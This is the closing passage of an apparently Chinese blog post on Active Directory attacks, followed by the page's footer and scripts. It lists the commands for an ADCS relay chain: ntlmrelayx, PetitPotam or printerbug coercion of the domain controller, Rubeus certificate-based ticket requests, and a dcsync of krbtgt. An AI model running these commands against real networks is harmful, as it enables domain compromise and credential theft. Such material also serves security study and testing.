+python3 ntlmrelayx.py <span class="token parameter variable">-t</span> http://192.168.184.216/certsrv/certfnsh.asp <span class="token parameter variable">-smb2support</span> <span class="token parameter variable">--adcs</span>
+
+<span class="token comment">#强制让域控机器向中继机器发起认证</span>
+PetitPotam.py Relayip DCip
+或者使用printerbug
+python3 printerbug.py mark/hacker@dcip  kaliip</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">Rubeus.exe asktgt /user:DC2012$ /certificate:<span class="token operator">&lt;</span>base64-certificate<span class="token operator">></span> /ptt
+dcsync red.lab red<span class="token punctuation">\</span>krbtgt</code></pre>
+
+</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://ta0.fun/posts/636860d3/" title="AD攻击">http://ta0.fun/posts/636860d3/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/d12a1edd/" rel="next" title="Linux远程连接RDP"><span class="post-nav-text">Linux远程连接RDP</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
